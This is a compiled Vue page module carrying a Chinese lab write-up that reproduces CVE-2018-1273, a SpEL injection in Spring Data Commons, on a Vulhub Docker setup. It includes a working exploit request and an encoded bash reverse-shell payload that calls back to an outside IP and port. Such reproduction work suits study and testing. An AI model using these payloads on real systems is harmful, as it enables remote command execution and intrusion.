import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c as l,a as e,b as a,d as n,e as r}from"./app-58e4a7d6.js";const d={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons 是 Spring Data 下所有子项目共享的基础框架。Spring Data Commons 在 2.0.5 及以前版本中，存在一处 SpEL 表达式注入漏洞，攻击者可以注入恶意 SpEL 表达式以执行任意命令。",-1),m=e("p",null,"参考链接：",-1),u={href:"https://pivotal.io/security/cve-2018-1273",target:"_blank",rel:"noopener noreferrer"},g={href:"https://xz.aliyun.com/t/2269",target:"_blank",rel:"noopener noreferrer"},v={href:"https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c",target:"_blank",rel:"noopener noreferrer"},h=r(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行下面命令启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>稍等一会，环境启动后，访问 <code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011520665.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>参考前面链接中的 Payload，在注册的时候抓包，并修改成如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /users?page=&amp;size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&amp;size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/awesome_poc&quot;)]=&amp;password=&amp;repeatedPassword=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011527857.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行 <code>docker-compose exec spring bash</code> 进入容器中，可见成功创建 <code>/tmp/awesome_poc</code>，说明命令执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011527377.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造反弹 shell 的 Payload（<strong>注意</strong>，Base64 编码后需要再进行 URL 编码，否则将反弹失败）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># URL编码前
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}

# URL编码后
bash -c {echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo%3D}|{base64,-d}|{bash,-i}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># Payload
username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo%3D}|{base64,-d}|{bash,-i}&quot;)]=&amp;password=&amp;repeatedPassword=
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>监听 9999 端口，成功接收反弹 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011534428.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16);function b(x,_){const i=s("ExternalLinkIcon");return o(),l("div",null,[c,p,m,e("ul",null,[e("li",null,[e("a",u,[a("https://pivotal.io/security/cve-2018-1273"),n(i)])]),e("li",null,[e("a",g,[a("https://xz.aliyun.com/t/2269"),n(i)])]),e("li",null,[e("a",v,[a("https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c"),n(i)])])]),h])}const z=t(d,[["render",b],["__file","Spring Data Commons 远程命令执行漏洞 CVE-2018-1273.html.vue"]]);export{z as default};
